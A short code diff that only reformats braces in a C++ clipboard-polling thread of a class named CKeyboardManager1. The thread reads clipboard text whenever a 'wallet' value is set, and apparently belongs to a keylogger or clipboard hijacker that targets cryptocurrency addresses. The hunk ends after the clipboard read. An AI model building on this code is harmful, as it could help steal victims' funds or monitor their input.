@@ -486,18 +486,17 @@ DWORD WINAPI CKeyboardManager1::Clipboard(LPVOID lparam)
     CKeyboardManager1* pThis = (CKeyboardManager1*)lparam;
     while (pThis->m_bIsWorking) {
         auto w = pThis->GetWallet();
-        if (w.empty()){
+        if (w.empty()) {
             Sleep(1000);
             continue;
-		}
+        }
         bool hasClipboard = false;
         try {
             hasClipboard = clip::has(clip::text_format());
-		}
-		catch (...) { // fix: "std::runtime_error" causing crashes in some cases
+        } catch (...) { // fix: "std::runtime_error" causing crashes in some cases
             hasClipboard = false;
             Sleep(3000);
-		}
+        }
         if (hasClipboard) {
             std::string value;
             clip::get_text(value);
